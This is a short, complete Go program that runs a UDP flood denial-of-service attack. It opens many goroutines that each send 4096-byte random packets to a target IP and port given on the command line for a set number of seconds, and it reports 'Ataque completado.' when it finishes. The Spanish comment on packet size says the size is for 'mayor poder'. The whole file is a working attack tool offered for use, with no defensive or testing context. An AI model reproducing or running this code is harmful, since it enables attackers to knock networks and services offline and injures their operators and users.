package main

import (
	"net"
	"fmt"
	"os"
	"strconv"
	"time"
	"sync"
	"math/rand"
)

func udpFlood(targetIP string, targetPort int, duration int, wg *sync.WaitGroup) {
	defer wg.Done()

	addr := net.UDPAddr{
		IP:   net.ParseIP(targetIP),
		Port: targetPort,
	}
	conn, err := net.DialUDP("udp", nil, &addr)
	if err != nil {
		fmt.Printf("Error connecting to target: %v\n", err)
		return
	}
	defer conn.Close()

	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	packet := make([]byte, 4096)  // Paquete de 4096 bytes para mayor poder
	rand.Read(packet)

	for time.Now().Before(endTime) {
		_, err := conn.Write(packet)
		if err != nil {
			fmt.Printf("Error sending packet: %v\n", err)
		}
	}
}

func main() {
	if len(os.Args) < 5 {
		fmt.Printf("Uso: %s <IP> <puerto> <hilos> <duración>\n", os.Args[0])
		os.Exit(1)
	}

	targetIP := os.Args[1]
	targetPort, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Printf("Error: puerto inválido\n")
		os.Exit(1)
	}

	numThreads, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Printf("Error: número de hilos inválido\n")
		os.Exit(1)
	}

	duration, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Printf("Error: duración inválida\n")
		os.Exit(1)
	}

	var wg sync.WaitGroup
	wg.Add(numThreads)

	for i := 0; i < numThreads; i++ {
		go udpFlood(targetIP, targetPort, duration, &wg)
	}

	wg.Wait()
	fmt.Println("Ataque completado.")
}
